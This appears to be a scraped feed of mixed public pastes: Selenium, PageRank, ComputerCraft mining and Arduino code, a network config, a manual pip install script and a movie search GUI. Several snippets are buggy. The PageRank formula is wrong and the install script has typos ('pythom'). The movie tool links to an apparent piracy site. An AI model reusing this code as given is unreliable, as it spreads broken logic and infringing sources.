			// Take a screenshot
            ((ITakesScreenshot)driver).GetScreenshot().SaveAsFile(""screenshot.png"");

            // Close the browser
            driver.Quit();
        }
    }
}"
ttPU2sHV,Untitled,Alexplazz,Python,Friday 15th of March 2024 06:43:06 PM CDT,"# PR(X) = (1-0.85) * 0.85(ETC)

class page:
    def __init__(self, name, links=None):
        if links is None:
            links = []

        self.name = name
        self.__links = links
        self.parent = False
        self.__latestPointsTo = []

    def __contains__(self, item):
        return item.name in self.__links

    def getInbounds(self):
        inboundPages = []
        for applicantPage in self.parent.getPages():
            if applicantPage == self:
                continue

            if self in applicantPage:
                inboundPages.append(applicantPage)
        self.__latestPointsTo = inboundPages
        return inboundPages

    def __len__(self):
        return len(self.__links)

    def __repr__(self):
        return f""Name:{self.name}\nPoints To:{','.join(self.__links)}\nPointed To By:{','.join([v.name for v in self.__latestPointsTo])}""
class index:
    def __init__(self, data = []):
        self.__data = data
        self.__pageRank = {}

    def index(self, page):
        self.__data.append(page)
        self.__pageRank[page] = 1
        page.parent = self

    def getPage(self, pageName):
        for v in self.__data:
            if v.name == pageName:
                return v
        return False

    def optimise(self):
        for indexedPage in self.__data:
            finalParameter = 0
            inboundPages = indexedPage.getInbounds()

            for v in inboundPages:
                finalParameter += (self.__pageRank[v] / len(v))

            self.__pageRank[indexedPage] = (1-0.85) * 0.85 * (finalParameter)

    def getPages(self):
        for v in self.__data:
            yield v

    @property
    def searchResults(self):
        record = False
        recordPage = False
        for v in self.getPages():
            if (not record) or self.__pageRank[v] > record:
                record = self.__pageRank[v]
                recordPage = v
        return recordPage

searchEngine = index()
searchEngine.index(page(""google"", [""youtube"", ""wiki""]))
searchEngine.index(page(""youtube"", [""wiki"", ""youtube"", ""google""]))
searchEngine.index(page(""wiki"", [""google"", ""youtube""]))

for i in range(500):
    searchEngine.optimise()

print(searchEngine.searchResults)
"
XiXBZTJB,quarryMiner,jig487,Lua,Friday 15th of March 2024 06:41:31 PM CDT,"--#########################################################
--declare and instantiate variables

local mineForward

local turn1
local turn2

local function mineLayer(length,width)
    for x = 1, length do
        mineForward(width)
        if x < length then
            if x%2 == 0 then
                turn2()
                mineForward(1)
                turn2()
            else
                turn1()
                mineForward(1)
                turn1()
            end
        end
    end
end


local function run(length,width,depth)

    --##########################################################
    --setup variables
    --local length = tonumber(tArgs[1])
    --local width  = tonumber(tArgs[2])
    --local depth  = tonumber(tArgs[3])

    local dir = ""right""

    local threeDeepLayers = math.floor(depth/3)
    local remainder = depth%3
    local twoDeepLayers = math.floor(remainder/2)
    local oneDeepLayers = remainder%2
    remainder = nil

    turn1 = turtle.turnRight
    turn2 = turtle.turnLeft

    --##########################################################
    --main program
    term.clear()
    term.setCursorPos(1,1)
    print(""depth:"",depth)
    print(""oneDeepLayers:"",oneDeepLayers)
    print(""twoDeepLayers:"",twoDeepLayers)
    print(""threeDeepLayers:"",threeDeepLayers)
    print()

    --do 1 deep layers:
    mineForward = function(blocks)
        blocks = blocks or 1
        for i = 1, blocks do
            while not turtle.forward() do
                turtle.dig()
            end
        end
    end

    print(""Starting 1 deep layers:"")
    for i = 1, oneDeepLayers do
    	print(""digLayer(forward)"")
        mineLayer(length,width-1)

    	if i == oneDeepLayers then
    		if twoDeepLayers > 0 then
    			--prep location for 2 deep layer mining
                print(""goDown(1)"")
                turn1()
                turn1()
                turtle.digDown()
                turtle.down()
    		elseif threeDeepLayers > 0 then
    			--prep location for 3 deep layer mining
    			print(""goDown(2)"")
                turn1()
                turn1()
                turtle.digDown()
                turtle.down()
                turtle.digDown()
                turtle.down()
    		end
    	else
    		print(""goDown(1)"")
            turn1()
            turn1()
            turtle.digDown()
            turtle.down()

    	end
        if length%2 == 0 then
            if dir == ""right"" then
                dir = ""left""
                turn1 = turtle.turnLeft
                turn2 = turtle.turnRight
            else
                dir = ""right""
                turn1 = turtle.turnRight
                turn2 = turtle.turnLeft
            end
        end
    end
    print(""Done with 1 deep layers"")

    --do 2 deep layers:
    mineForward = function(blocks)
        blocks = blocks or 1
        for i = 1, blocks do
            turtle.digDown()
            while not turtle.forward() do
                turtle.dig()
            end
        end
        turtle.digDown()
    end

    print(""Starting 2 deep layers"")
    for i = 1, twoDeepLayers do
    	print(""digLayer(forward,down)"")
        mineLayer(length,width-1)

    	if i == twoDeepLayers then
    		if threeDeepLayers > 0 then
    			--prep location for 3 deep layer mining
    			print(""goDown(3)"")
                turn1()
                turn1()
                turtle.digDown()
                turtle.down()
                turtle.digDown()
                turtle.down()
                turtle.digDown()
                turtle.down()
    		end
    	else
    		print(""goDown(2)"")
            turn1()
            turn1()
            turtle.digDown()
            turtle.down()
            turtle.digDown()
            turtle.down()
    	end

        if length%2 == 0 then
            if dir == ""right"" then
                dir = ""left""
                turn1 = turtle.turnLeft
                turn2 = turtle.turnRight
            else
                dir = ""right""
                turn1 = turtle.turnRight
                turn2 = turtle.turnLeft
            end
        end
    end
    print(""Done with 2 deep layers"")

    --do 3 deep layers:
    mineForward = function(blocks)
        blocks = blocks or 1
        for i = 1, blocks do
            turtle.digUp()
            turtle.digDown()
            while not turtle.forward() do
                turtle.dig()
            end
        end
        turtle.digUp()
        turtle.digDown()
    end

    for i = 1, threeDeepLayers do
        --prep location in case prep hasn't happened yet
        if i == 1 and oneDeepLayers == 0 and twoDeepLayers == 0 then
            turtle.digDown()
            turtle.down()
        end
    	print(""digLayer(up,forward,down)"")
        mineLayer(length,width-1)

        if i < threeDeepLayers then
    	    print(""goDown(3)"")
            turn1()
            turn1()
            turtle.digDown()
            turtle.down()
            turtle.digDown()
            turtle.down()
            turtle.digDown()
            turtle.down()
        end

        if length%2 == 0 then
            if dir == ""right"" then
                dir = ""left""
                turn1 = turtle.turnLeft
                turn2 = turtle.turnRight
            else
                dir = ""right""
                turn1 = turtle.turnRight
                turn2 = turtle.turnLeft
            end
        end
    end

    print(""Finished quarrying!"")
    print(""Press 'enter' to return to menu"")
    read()
end

return {
    run = run
}"
CftYYagg,programMenuGUI,jig487,Lua,Friday 15th of March 2024 06:37:09 PM CDT,"local quarryMiner = require(""quarryMiner"")
local stripMiner = require(""stripMiner"")

--##Key grabber##
--local evt, key = os.pullEvent(""key"")

local titleColor = colors.lightBlue
local menuColor = colors.purple
local textColor = colors.white
local highlightColor = colors.pink

local menuColors = {
    title = titleColor,
    menu = menuColor,
    text = textColor,
    highlight = highlightColor
}

--(menu = array of strings, colorList = array of named colors)
--returns: cursor as int, item name as string, bool as true if user chose option/ false if user wants to exit
local function openMenu(menu,colorList)
    local col = term.getTextColor()
    local cursor = 1
    term.clear()
    while true do
        term.setCursorPos(1,1)
        term.setTextColor(colorList.menu)
        print(""Use the arrow keys to navigate"")
        print(""Press 'enter' to select, 'backspace' to exit"")
        if menu.name then
            term.setTextColor(colorList.title)
            print(""<<< ""..menu.name.."" >>>"")
        end
        term.setCursorPos(1,5)
        for i = 1, #menu do
            if cursor == i then
                term.setTextColor(colorList.highlight)
                print(""{""..i..""} ""..menu[i])
            else
                term.setTextColor(colorList.text)
                print(""[""..i..""] ""..menu[i])
            end
        end

        local evt, key = os.pullEvent(""key"")
        key = keys.getName(key)
        if key == ""up"" and cursor > 1 then
            cursor = cursor - 1
        elseif key == ""down"" and cursor < #menu then
            cursor = cursor + 1
        --elseif key == ""left"" then
        --elseif key == ""right"" then
        elseif key == ""enter"" then
            term.setTextColor(col)
            return cursor, menu[cursor], true
        elseif key == ""backspace"" then
            term.setTextColor(col)
            return cursor, menu[cursor], false
        end 
    end
end

local function openNumberMenu(menu,colorList,numberList)
    --numberList = numberList or {}
    if numberList == nil then
        numberList = {}
        for i = 1, #menu do
            numberList[i] = 0
        end
    end

    local col = term.getTextColor()
    local cursor = 1
    --term.clear()
    while true do
        term.clear()
        term.setCursorPos(1,1)
        term.setTextColor(colorList.menu)
        print(""Use the arrow keys to navigate"")
        print(""Press 'enter' to select, 'backspace' to exit"")
        if menu.name then
            term.setTextColor(colorList.title)
            print(""<<< ""..menu.name.."" >>>"")
        end
        term.setCursorPos(1,5)
        for i = 1, #menu do
            if cursor == i then
                term.setTextColor(colorList.highlight)
                print(""{""..i..""} ""..menu[i].."": ""..numberList[i])
            else
                term.setTextColor(colorList.text)
                print(""[""..i..""] ""..menu[i].."": ""..numberList[i])
            end
        end

        local len = #menu+2
        if cursor == len-1 then
            term.setTextColor(colorList.highlight)
            print(""{""..(len-1)..""} Confirm"")
            term.setTextColor(colorList.text)
            print(""[""..(len)..""] Exit"")
        elseif cursor == len then
            term.setTextColor(colorList.text)
            print(""[""..(len-1)..""] Confirm"")
            term.setTextColor(colorList.highlight)
            print(""{""..(len)..""} Exit"")
        else
            term.setTextColor(colorList.text)
            print(""[""..(len-1)..""] Confirm"")
            print(""[""..(len)..""] Exit"")
        end

        local evt, key = os.pullEvent(""key"")
        key = keys.getName(key)
        if key == ""up"" and cursor > 1 then
            cursor = cursor - 1
        elseif key == ""down"" and cursor < len then
            cursor = cursor + 1
        --elseif key == ""left"" then
        --elseif key == ""right"" then
        elseif key == ""enter"" then
            if cursor == len-1 then
                term.setTextColor(col)
                return cursor, numberList, true
            elseif cursor == len then
                term.setTextColor(col)
                return cursor, numberList, false
            else
                local lineLen = #(""{""..cursor..""} ""..menu[cursor].."": "")
                term.setCursorPos(lineLen+1,cursor+4)
                term.setTextColor(colorList.menu)
                numberList[cursor] = tonumber(read(nil,nil,nil,tostring(numberList[cursor])))
                term.setTextColor(colorList.text)
            end
        elseif key == ""backspace"" then
            term.setTextColor(col)
            return cursor, numberList, false
        end
    end
end

--######### Main Program Start ##############

local menu = {name = ""Main Menu"", ""Quarry Miner"", ""Strip Miner""}

local quarryMenu = {name = ""Quarry Miner"", ""X (right)"", ""Y (forward)"", ""Z (depth)""}
local quarryNums = {0,0,0}

local stripMineMenu = {name = ""Strip Miner"", ""X (columns)"", ""Y (depth)"", ""direction (0=right, 1=left)""}
local stripMineNums = {0,0,0}

while true do
    local cursor,_,_ = openMenu(menu,menuColors)
    term.clear()

    if cursor == 1 then
        _,quarryNums,val = openNumberMenu(quarryMenu,menuColors,quarryNums)
        if val == true then
            quarryMiner.run(quarryNums[1],quarryNums[2],quarryNums[3])
        end
    elseif cursor == 2 then
        _,stripMineNums,val = openNumberMenu(stripMineMenu,menuColors,stripMineNums)
        if val == true then
            stripMiner.run(stripMineNums[1],stripMineNums[2],stripMineNums[3])
        end
    end
    term.clear()
end"
AQPrWiGL,sketchYetch.ino,j0h,Arduino,Friday 15th of March 2024 06:36:15 PM CDT,"#include <Encoder.h>
#include <Keyboard.h>

// Deine IO
#define ENCODER1_PINA 1
#define ENCODER1_PINB 3
#define ENCODER2_PINA 5
#define ENCODER2_PINB 7
#define color_Btn     11  // g key
#define clear_Btn     27  // c key
#define lift_Btn      9   // l key
#define save_Btn      29  // s key
#define demo_Btn      31  // d
// Create encoder objects
// Apparently encoder.h inits my pins
Encoder encoder1(ENCODER1_PINA, ENCODER1_PINB);
Encoder encoder2(ENCODER2_PINA, ENCODER2_PINB);

// Variables to track encoder movement direction
int prevEncoder1Position = 0;
int prevEncoder2Position = 0;

void setup() {
  //pinMode(ENCODER1_PINA, INPUT_PULLUP);
  //pinMode(ENCODER1_PINB, INPUT_PULLUP);
  //pinMode(ENCODER2_PINA, INPUT_PULLUP);
  //pinMode(ENCODER2_PINB, INPUT_PULLUP);
  pinMode(color_Btn, INPUT_PULLUP);
  pinMode(clear_Btn, INPUT_PULLUP);
  pinMode(lift_Btn,  INPUT_PULLUP);
  pinMode(save_Btn,  INPUT_PULLUP);
  pinMode(demo_Btn,  INPUT_PULLUP);  
  
  Serial.begin(9600);
  delay(3000);
  while (!Serial) {
    ; // Wait for serial port to connect
  }

  Keyboard.begin();
}

void loop() {
  // Read encoder positions
  int encoder1Position = encoder1.read();
  int encoder2Position = encoder2.read();

  // Detect encoder 1 movement direction
  int encoder1Direction = 0;
  if (encoder1Position > prevEncoder1Position) {
    encoder1Direction = 1; // Positive direction
  } else if (encoder1Position < prevEncoder1Position) {
    encoder1Direction = -1; // Negative direction
  }

  // Detect encoder 2 movement direction
  int encoder2Direction = 0;
  if (encoder2Position > prevEncoder2Position) {
    encoder2Direction = 1; // Positive direction
  } else if (encoder2Position < prevEncoder2Position) {
    encoder2Direction = -1; // Negative direction
  }

  // Update previous positions for next iteration
  prevEncoder1Position = encoder1Position;
  prevEncoder2Position = encoder2Position;

  // Use encoder direction variables to perform actions
  if (encoder1Direction == 1) {
    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.release(KEY_LEFT_ARROW);
  } else if (encoder1Direction == -1) {
    Keyboard.press(KEY_RIGHT_ARROW);
    Keyboard.release(KEY_RIGHT_ARROW);
  } else {
    Keyboard.release(KEY_RIGHT_ARROW);
    Keyboard.release(KEY_LEFT_ARROW);
  }

  if (encoder2Direction == 1) {
    Keyboard.press(KEY_UP_ARROW);
    Keyboard.release(KEY_UP_ARROW);
  } else if (encoder2Direction == -1) {
    //Serial.println(""Encoder 2: Negative"");
    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.release(KEY_DOWN_ARROW);
  } else {
    Keyboard.release(KEY_DOWN_ARROW);
    Keyboard.release(KEY_UP_ARROW);
  }

 
  if(digitalRead(color_Btn) == LOW){
   // Serial.println(""G"");
    Keyboard.press(KEY_G);
    Keyboard.release(KEY_G);
    }
  if(digitalRead(clear_Btn) == LOW){
    //Serial.println(""C"");
    Keyboard.press(KEY_C);
    Keyboard.release(KEY_C);
    }
    
  if(digitalRead(lift_Btn) == LOW){
    //Serial.println(""L"");
    Keyboard.press(KEY_L);
    Keyboard.release(KEY_L);
    }
/* 
  if(digitalRead(save_Btn) == LOW){
    Serial.println(""S"");
    //Keyboard.press(KEY_S);
    //Keyboard.release(KEY_S);
    delay(3000); //can we save a file in 3s?
    } 

  if(digitalRead(demo_Btn) == LOW){
    Serial.println(""D"");
    //Keyboard.press(KEY_D);
    //Keyboard.release(KEY_D);
    }   
*/
  // Delay to prevent spamming
  delay(100);
}
"
PrwvbT5N,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Friday 15th of March 2024 06:35:23 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Self destroy pastes
Share pastes on social network
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
iqnqnAqm,MOVEIS-SEARCH.py,Najeebsk,Python,Friday 15th of March 2024 06:17:03 PM CDT,"import tkinter as tk
from tkinter import scrolledtext
import subprocess
import webbrowser
from imdb import IMDb

def search_movies():
    keyword = entry_search.get()
    ia = IMDb()
    movies = ia.search_movie(keyword)
    result_text.delete('1.0', tk.END)
    if not movies:
        result_text.insert(tk.END, ""No results found."")
    else:
        for movie in movies[:10]:  # Displaying the first 10 results
            title = movie['title']
            year = movie.get('year', 'N/A')  # Get the year if available, otherwise use 'N/A'
            result_text.insert(tk.END, f""{title} ({year})\n"")
            if 'imdb_id' in movie:
                link = f""https://www.imdb.com/title/{movie['imdb_id']}/""
                result_text.insert(tk.END, f""Link: {link}\n\n"")
            else:
                result_text.insert(tk.END, ""\n"")

def open_browser():
    selected_text = result_text.tag_ranges(tk.SEL)
    if selected_text:
        selected_movie_link = result_text.get(*selected_text).strip()
        if selected_movie_link.startswith(""http://"") or selected_movie_link.startswith(""https://""):
            webbrowser.open(selected_movie_link)
        else:
            # Assuming selected_movie_link is the movie title and we construct the m4ufree link
            m4ufree_link = f""https://m4ufree.vip/search/{selected_movie_link}.html""
            webbrowser.open(m4ufree_link)

# GUI
root = tk.Tk()
root.title(""Movie Search"")

# Define colors
background_color = '#333333'
text_color = '#FFFFFF'
button_color = '#4CAF50'
button_text_color = '#FFFFFF'

root.config(bg=background_color)

frame_search = tk.Frame(root, bg=background_color)
frame_search.pack(pady=10)

label_search = tk.Label(frame_search, text=""Enter Movie Name:"", bg=background_color, fg=text_color)
label_search.pack(side=tk.LEFT)

entry_search = tk.Entry(frame_search, width=30)
entry_search.pack(side=tk.LEFT)

button_search = tk.Button(frame_search, text=""Search"", command=search_movies, bg=button_color, fg=button_text_color)
button_search.pack(side=tk.LEFT, padx=10)

frame_result = tk.Frame(root, bg=background_color)
frame_result.pack(pady=10)

result_text = scrolledtext.ScrolledText(frame_result, width=50, height=20, bg=background_color, fg=text_color)
result_text.pack(side=tk.LEFT)

button_open_browser = tk.Button(frame_search, text=""Open in Browser"", command=open_browser, bg=button_color, fg=button_text_color)
button_open_browser.pack(side=tk.LEFT)

root.mainloop()
"
xHc5eadz,interfaces_firewall,tferreira,Bash,Friday 15th of March 2024 06:12:50 PM CDT,"# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

auto enp0s3
iface enp0s3 inet static
        address 172.17.0.1
        netmask 255.255.255.0
        network 172.17.0.0
        broadcast 172.17.0.255

auto enp0s8
iface enp0s8 inet static
        address 192.168.200.1
        netmask 255.255.255.0
        network 192.168.200.0
        broadcast 192.168.200.255


# The primary network interface
auto enp0s9
iface enp0s9 inet dhcp

auto enp0s10
iface enp0s10 inet static
        address 192.168.56.200/24
"
4M2maYyC,Install PIP manually,Justman10000,Bash,Friday 15th of March 2024 04:45:39 PM CDT,"# You need Python
## Buily manually with https://www.build-python-from-source.com
## Or with APT (apt install python3 -y)

wget https://files.pythonhosted.org/packages/4d/5b/dc575711b6b8f2f866131a40d053e30e962e633b332acf7cd2c24843d83d/setuptools-69.2.0.tar.gz
gunzip setuptools-69.2.0.tar.gz
tar xvf setuptools-69.2.0.tar.gz
cd setuptools-69.2.0
pythom setup.py install

wget https://files.pythonhosted.org/packages/94/59/6638090c25e9bc4ce0c42817b5a234e183872a1129735a9330c472cc2056/pip-24.0.tar.gz
gunzip pip-24.0.tar.gz
tar xvf pip-24.0.tar.gz
cd pip-24.0
pythom setup.py install

rm -r setuptools-69.2.0 pip-24.0

python -m pip install pip --break-system-packages --force-reinstall
python -m pip install setuptools --break-system-packages --force-reinstall"
v58LuVs4,Untitled,swte,JavaScript,Friday 15th of March 2024 04:32:16 PM CDT,"document.addEventListener('DOMContentLoaded', function(){window.location.search.includes('blabla') && (document.getElementById('testcheckbox').checked = true);});"
